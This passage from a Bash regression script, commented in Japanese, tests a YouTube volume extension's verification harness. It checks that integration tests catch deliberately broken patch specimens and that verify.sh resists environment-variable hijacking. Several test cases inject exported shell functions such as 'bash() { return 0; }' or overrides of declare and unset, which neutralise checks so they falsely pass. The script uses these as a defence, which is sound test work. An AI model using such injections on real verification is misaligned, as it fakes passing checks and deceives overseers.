  bash tools/scan_hooks.sh

echo "=== popup ⇄ content の結合テストの回帰（継ぎ目を壊したら本当に赤くなるか） ==="
# content.js と popup.js の継ぎ目は、どちらの単体テストにも入らない。
# test/integration.test.js がその継ぎ目を実物同士で往復させて見ているが、
# 「見ているつもりで何も見ていない」状態を防ぐには、壊した検体で赤くなることを実測するしかない。
# 検体は src の写しではなく「本物を1点だけ書き換える patch」なので、src が変わって
# 当たらなくなったら検体自身が例外を投げて赤くなる（腐った検体で緑にならない）。
INTEG="$FIX/integration"

integration_case() {
  local var="$1" val="$2" want_test="$3" desc="$4" out rc
  out="$(env "$var=$val" node --test test/integration.test.js 2>&1)"
  rc=$?
  if [ "$rc" -eq 0 ]; then
    echo "[NG] $desc : 継ぎ目を壊したのに結合テストが緑になった（fail-open）"
    FAIL=$((FAIL + 1))
    return 1
  fi
  if ! echo "$out" | grep -q "^not ok .*$want_test"; then
    echo "[NG] $desc : 落ちるべきテスト '$want_test' が失敗一覧に無い"
    echo "$out" | grep -E '^not ok' | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
    return 1
  fi
  echo "[OK] $desc (exit=$rc / '$want_test' が落ちた)"
  PASS=$((PASS + 1))
  return 0
}

run_case 0 "本物の src で結合テストが緑（過検知していない）" \
  node --test test/integration.test.js
integration_case YTVP_POPUP_PATCH "$INTEG/patch_popup_flat_setsettings.js" 'seam1' \
  "popup が setSettings を平置きで投げる検体を結合テストが捕まえる"
integration_case YTVP_CONTENT_PATCH "$INTEG/patch_content_partial_settings.js" 'seam2' \
  "content の settingsReply が boostAllowed を落とす検体を結合テストが捕まえる"
# v0.7 で狙い先を seam2e2e から seam2 へ移した（緩めたのではなく、症状が消えたため）。
# ポップアップが自前で描くのをやめ、上限は overlay が getState で受け取る真の状態から
# 引くようになったので、「setSettings の応答が部分オブジェクトだと popup の上限が
# 100 に落ちる」という **e2e の症状そのものが起きなくなった**（実測: この検体で
# seam2e2e は緑のまま）。契約違反は残るので、契約を直接見ている seam2 で捕まえる。
# seam2e2e が空振りでないことは、下の patch_popup_flat_setsettings.js と
# patch_overlay_preset_local_only.js の両方が seam2e2e を落とすことで実測済み。
integration_case YTVP_CONTENT_PATCH "$INTEG/patch_content_partial_setsettings_reply.js" 'seam2' \
  "setSettings の応答だけを部分オブジェクトにした検体（外科的な版）を結合テストが捕まえる"
integration_case YTVP_MANIFEST_PATH "$INTEG/bad_manifest_www_only.json" 'seam3' \
  "manifest の matches が www だけの検体を結合テストが捕まえる"

# 継ぎ目4（SPEC 3-d）。実測で見つかった本物の製品バグ
# 「ブーストを一度 OFF にすると二度と ON に戻せない一方通行」を、検体で戻して赤くなるか見る。
# 検査を足しただけでは「戻ってこない」ことの保証にならない。バグを戻して赤くなることまで実測する。
integration_case YTVP_CONTENT_PATCH "$INTEG/patch_content_boost_oneway.js" 'seam4-boost-roundtrip' \
  "content が OFF のあと ON に戻さない検体（一方通行）を結合テストが捕まえる"
integration_case YTVP_POPUP_PATCH "$INTEG/patch_popup_boost_oneway.js" 'seam4-popup-not-oneway' \
  "popup が boostAllowed:false のときブーストの要求を出さない検体（早期 return の一方通行）を結合テストが捕まえる"
integration_case YTVP_POPUP_PATCH "$INTEG/patch_popup_optimistic_boost.js" 'seam4-no-optimistic' \
  "popup が応答を待たずに表示を反映する検体（楽観更新）を結合テストが捕まえる"

# 継ぎ目5（SPEC 3-d/5・オーバーレイ側）。65b4ccf で直した本物の製品バグ
# 「boostAllowed:false のときブーストボタンを生成すらしない」を戻して、赤くなるか見る。
# この修正を守るものは 2864b6a まで1つも無かった。
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_boost_conditional.js" 'seam5-overlay-boost-rendered' \
  "overlay が boostAllowed:false でブーストボタンを生成しない検体（65b4ccf で直したバグ）を結合テストが捕まえる"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_optimistic_boost.js" 'seam5-overlay-no-optimistic' \
  "overlay が応答を待たずに表示を反転する検体（楽観更新・SPEC 3-e(2)）を結合テストが捕まえる"

# 継ぎ目6（SPEC 3-d・MAIN world の遅延注入）。c8c17e9 で塞いだ本物の製品バグ
# 「page.js の注入が遅れると state.boost が false になり 150 が 100 に丸められる」を戻して、赤くなるか見る。
integration_case YTVP_CONTENT_PATCH "$INTEG/patch_content_mainworld_boost.js" 'seam6-mainworld-late' \
  "content が MAIN world の boost をそのまま採用する検体（c8c17e9 で直したバグ）を結合テストが捕まえる"

# 継ぎ目7（SPEC 第9章・ネイティブ統合UI）。content.js(c139b05) が探して渡し、overlay.js(541bb09) が描く。
# この継ぎ目の危険は「片方が仕事をやめても、両方とも自分の契約は守ったまま機能だけが消える」こと。
#   * overlay が nativeAnchor を無視 → overlay 単体では v0.1 と同じ正しい実装に見える
#   * content が nativeAnchor を渡さない → overlay は「未指定なら浮きハンドル」の契約どおりに動く
# どちらも例外を出さず、権限も通信も変わらないので、他のどの検査にも掛からない。
# 検体を刺して seam7-* が本当に赤くなるところまで実測する。
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_ignore_native.js" 'seam7-native-btn-in-controls' \
  "overlay が nativeAnchor を無視して常に浮きハンドルにする検体（ネイティブ統合が丸ごと消えた状態）を結合テストが捕まえる"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_ignore_native.js" 'seam7-native-panel-preset' \
  "同検体で「ボタンからパネルを開いて音量を変える」経路も赤くなる（差し込みだけでなく操作系まで見ている証明）"
integration_case YTVP_CONTENT_PATCH "$INTEG/patch_content_no_native_anchor.js" 'seam7-native-btn-in-controls' \
  "content が mount へ nativeAnchor を渡さない検体（c139b05 の配線が消えた状態）を結合テストが捕まえる"
integration_case YTVP_CONTENT_PATCH "$INTEG/patch_content_no_native_anchor.js" 'seam7-rebind-single' \
  "同検体で SPA 遷移後の再バインドも赤くなる（初回 mount だけを見ているのではない証明）"
integration_case YTVP_CONTENT_PATCH "$INTEG/patch_content_native_all_hosts.js" 'seam7-music-float' \
  "music.youtube.com を対象ホストに足した検体（SPEC 9-b の除外を外した状態）を結合テストが捕まえる"
# 「入ったかどうか」ではなく「どこに入ったか」まで見ている証明。末尾に差し込んでも
# ボタンは存在し、押せばパネルも開くので、位置を見ていない検査は素通りする。
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_append_last.js" 'seam7-native-btn-in-controls' \
  "ボタンを .ytp-right-controls の末尾に差し込む検体（SPEC 9-a は先頭を指定している）を結合テストが捕まえる"

# 継ぎ目8（v0.6 の導線・SPEC 12-a とホバー/固定/初回ヒント）。
# 2026-09-03 の実測では、この3機能を守るテストは1本も無かった（test/ に mouseenter /
# hover / pinned / gear / firstRunHint を含むファイルが1つも無い状態）。
# 検査を足しただけでは「守っている」ことにならないので、導線を1つずつ壊して
# **狙ったテストが落ちるところまで**実測する。どの検体がどれを落とすかは各検体の冒頭に書いた。
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_gear_always.js" 'seam8-gear-only-with-setsettings' \
  "保存先が無い相手にも ⚙ を出す検体（押せるのに何も起きないボタン）を結合テストが捕まえる"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_preset_local_only.js" 'seam8-gear-opens-and-applies' \
  "⚙ の「適用」が bridge.setSettings へ流れない検体（保存されない設定）を結合テストが捕まえる"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_preset_local_only.js" 'seam8-panel-preset-e2e' \
  "同検体で content の storage まで届かないことも赤くなる（overlay 単体でなく配線まで見ている証明）"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_no_hover.js" 'seam8-hover-open-close' \
  "ホバーの導線を丸ごと消した検体（v0.5 と同じ挙動へ戻る）を結合テストが捕まえる"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_never_close.js" 'seam8-hover-open-close' \
  "離れても閉じない検体（開く側は正しいまま）を結合テストが捕まえる＝「閉じる」側も見ている証明"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_no_pin.js" 'seam8-click-pins' \
  "クリックしても固定しない検体（手を離すと消える）を結合テストが捕まえる"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_hover_focus.js" 'seam8-hover-no-focus' \
  "ホバーでも入力欄のフォーカスを奪う検体（YouTube のショートカットが死ぬ）を結合テストが捕まえる"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_close_while_typing.js" 'seam8-no-close-while-typing' \
  "編集中でも構わず閉じる検体（打ちかけの文字が消える）を結合テストが捕まえる"
integration_case YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_close_while_typing.js" 'seam8-no-close-while-typing-presets' \
  "同検体でプリセット欄の側も赤くなる（音量欄だけを見ているのではない証明）"
integration_case YTVP_CONTENT_PATCH "$INTEG/patch_content_hint_always.js" 'seam8-hint-once' \
  "初回ヒントを mount のたびに出す検体（遷移のたびに出る）を結合テストが捕まえる"
integration_case YTVP_CONTENT_PATCH "$INTEG/patch_content_hint_ignore_stored.js" 'seam8-hint-not-repeated' \
  "storage の既読を無視する検体（開き直すたびに1回出る）を結合テストが捕まえる"

echo "=== verify.sh が環境変数に乗っ取られないことの実測 ==="
# 目的: フックは生かしたまま（mutation testing に要る）、verify.sh の内側では殺す。
# 手順1（フックが生きている）: node --test を直接叩けば mutant で赤くなる  ← 上の mutant_case 群
# 手順2（乗っ取られない）    : 同じ環境変数を付けて verify.sh を起動しても項目3が [OK]  ← ここ
# 判定に verify.sh 全体の exit code を使わない。項目9などが実装の途中で赤いことがあるため、
# 見るのは「項目3の行が [OK] か」だけにする。
verify_not_hijacked() {
  local var="$1" val="$2" desc="$3" item="${4:-3}" out line
  out="$(env "$var=$val" bash verify.sh 2>&1)"
  line="$(echo "$out" | grep -E "^\[(OK|NG)\] $item\." | head -1)"
  if [ -z "$line" ]; then
    echo "[NG] $desc : verify.sh の出力に項目$item の行が無い"
    echo "$out" | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
    return 1
  fi
  case "$line" in
    "[OK]"*) echo "[OK] $desc （$line）"; PASS=$((PASS + 1)); return 0 ;;
    *)       echo "[NG] $desc : 環境変数に乗っ取られた（$line）"; FAIL=$((FAIL + 1)); return 1 ;;
  esac
}
echo "=== verify.sh が継承シェル関数に無効化されないことの実測 ==="
# 由来: 独立検証での実測（2026-09-02）。
#   $ bash() { return 0; }; export -f bash; ./verify.sh
#   → 13 項目中 8 項目が、スキャナを1本も起動しないまま [OK] を返した。
#   赤くなったのは項目5だけで、それは項目5にだけ空振り検知があったため。
# 塞ぎ方は2層ある。**どちらか片方でも欠けたらこの回帰が赤くなるように書く。**
#   層1: verify.sh 冒頭で継承関数を unset -f し、汚染環境の結果は採用しない（fail-closed）
#   層2: 各項目が「検査器の署名行」を要求する（層1が盲にされても効く最後の防波堤）
#
# 注意: ここは verify.sh を入れ子で起動する。--no-verify-recursion のときは実行しない
#       （verify.sh の項目8 がこのスクリプトを呼ぶため、外さないと無限再帰する）。

# $1=注入するシェルコード $2=[NG]行の下限 $3=説明 $4=出力に必須の文字列（省略可）
verify_must_not_be_green() {
  local inject="$1" min_ng="$2" desc="$3" must="${4:-}" out rc ng_n
  out="$(bash -c "$inject"'; exec ./verify.sh' 2>&1)"
  rc=$?
  ng_n="$(printf '%s\n' "$out" | grep -c '^\[NG\]')"
  if [ "$rc" -eq 0 ]; then
    echo "[NG] $desc : verify.sh が exit=0（緑になった＝検査を無効化できている）"
    printf '%s\n' "$out" | tail -20 | sed 's/^/       | /'
    FAIL=$((FAIL + 1)); return 1
  fi
  if [ "$ng_n" -lt "$min_ng" ]; then
    echo "[NG] $desc : [NG] 行が $ng_n 件しか出ていない（下限 $min_ng 件）"
    printf '%s\n' "$out" | sed 's/^/       | /'
    FAIL=$((FAIL + 1)); return 1
  fi
  if [ -n "$must" ] && ! printf '%s\n' "$out" | grep -qF -- "$must"; then
    echo "[NG] $desc : 出力に '$must' が無い（想定した機構ではない理由で赤くなっている疑い）"
    printf '%s\n' "$out" | sed 's/^/       | /'
    FAIL=$((FAIL + 1)); return 1
  fi
  echo "[OK] $desc (exit=$rc, NG=$ng_n 件)"
  PASS=$((PASS + 1)); return 0
}

# $1=注入するシェルコード（空可） $2=verify.sh の引数（空可） $3=説明
# 期待: exit=0 / fail=0 / pass>=13 / 空振り検知が1件も出ない（＝過検知ゼロの対照）
verify_must_be_green() {
  local inject="$1" args="$2" desc="$3" out rc pass_n
  if [ -n "$inject" ]; then
    out="$(bash -c "$inject"'; exec ./verify.sh '"$args" 2>&1)"
  else
    out="$(./verify.sh $args 2>&1)"
  fi
  rc=$?
  if [ "$rc" -ne 0 ]; then
    echo "[NG] $desc : verify.sh が exit=$rc（過検知。関数注入が無いのに赤くなった）"
    printf '%s\n' "$out" | grep -E '^\[NG\]' | sed 's/^/       | /'
    FAIL=$((FAIL + 1)); return 1
  fi
  pass_n="$(printf '%s\n' "$out" | sed -n 's/^pass=\([0-9]*\) fail=.*/\1/p' | tail -1)"
  if ! printf '%s\n' "$out" | grep -q 'fail=0$' || [ -z "$pass_n" ] || [ "$pass_n" -lt 13 ]; then
    echo "[NG] $desc : 集計行が想定外（pass=$pass_n）"
    printf '%s\n' "$out" | tail -5 | sed 's/^/       | /'
    FAIL=$((FAIL + 1)); return 1
  fi
  if printf '%s\n' "$out" | grep -q '空振り検知'; then
    echo "[NG] $desc : 通常実行なのに空振り検知が鳴っている（過検知）"
    printf '%s\n' "$out" | grep '空振り検知' | sed 's/^/       | /'
    FAIL=$((FAIL + 1)); return 1
  fi
  echo "[OK] $desc (exit=0, pass=$pass_n fail=0)"
  PASS=$((PASS + 1)); return 0
}

if [ "$RUN_VERIFY_CASES" -eq 1 ]; then
  # 対照（過検知ゼロ）。これが無いと「常に赤くする」実装でも上の注入ケースは通ってしまう。
  verify_must_be_green "" "" "対照: 関数注入が無ければ従来どおり pass=13 fail=0 / exit=0"

  # 層1（消毒 + 汚染環境の不採用）。実測された注入そのもの。
  verify_must_not_be_green 'bash() { return 0; }; export -f bash' 2 \
    "bash() を継承させても緑にならない（実測された穴そのもの）" '[NG] 0.'
  verify_must_not_be_green 'node() { return 0; }; export -f node' 2 \
    "node() を継承させても緑にならない" '[NG] 0.'
  verify_must_not_be_green 'grep() { return 0; }; export -f grep' 2 \
    "grep() を継承させても緑にならない" '[NG] 0.'
  verify_must_not_be_green 'python3() { return 0; }; export -f python3' 2 \
    "python3() を継承させても緑にならない（verify.sh が使わないコマンドでも汚染は汚染）" '[NG] 0.'

  # 消毒が本当に効いていることの実測。--allow-inherited-functions は「不採用にする判定」だけを
  # 解除し、unset -f は解除しない。したがって bash() を継承させても全項目が正常に走って緑になる。
  # ここが赤くなるなら、消毒が効いていない（＝子プロセスへ関数が漏れている）。
  verify_must_be_green 'bash() { return 0; }; export -f bash' '--allow-inherited-functions' \
    "bash() を継承 + --allow-inherited-functions なら全項目が正常に走る（unset -f が実際に効いている証明）"

  # 層2（空振り検知）。消毒器そのものを盲にしてから殺す。
  # declare を関数で潰すと verify.sh の消毒ループは空回りし、層1は検知も消毒もできない。
  # そのとき残るのは「検査器の署名が出ているか」だけであり、それが効いていることを実測する。
  verify_must_not_be_green \
    'declare() { return 0; }; unset() { return 0; }; bash() { return 0; }; export -f declare unset bash' 5 \
    "消毒器を盲にして bash() を殺しても、空振り検知で複数項目が赤くなる" '空振り検知'
  verify_must_not_be_green \
    'declare() { return 0; }; unset() { return 0; }; node() { return 0; }; export -f declare unset node' 3 \
    "消毒器を盲にして node() を殺しても、空振り検知（陽性対照・集計行）で赤くなる" '空振り検知'

  verify_not_hijacked YTVP_VOLUME_PATH   "$FIX/mutants/volume_noclamp.js" \
    "YTVP_VOLUME_PATH に mutant を刺しても verify.sh の項目3は緑"
  verify_not_hijacked YTVP_MANIFEST_PATH "$FIX/bad_tabs.json" \
    "YTVP_MANIFEST_PATH に違反 manifest を刺しても verify.sh の項目3は緑"
  verify_not_hijacked YTVP_CONTENT_PATCH "$INTEG/patch_content_partial_settings.js" \
    "YTVP_CONTENT_PATCH に検体を刺しても verify.sh の項目11は緑" 11
  verify_not_hijacked YTVP_POPUP_PATCH "$INTEG/patch_popup_flat_setsettings.js" \
    "YTVP_POPUP_PATCH に検体を刺しても verify.sh の項目11は緑" 11
  verify_not_hijacked YTVP_OVERLAY_PATCH "$INTEG/patch_overlay_boost_conditional.js" \
    "YTVP_OVERLAY_PATCH に検体を刺しても verify.sh の項目11は緑" 11
else
  echo "[SKIP] verify.sh 起動ケース13件（--no-verify-recursion 指定。verify.sh からの入れ子実行のため）"
fi

echo "----"
echo "scanner_regress: pass=$PASS fail=$FAIL"
if [ "$FAIL" -gt 0 ]; then
  exit 1
fi
exit 0
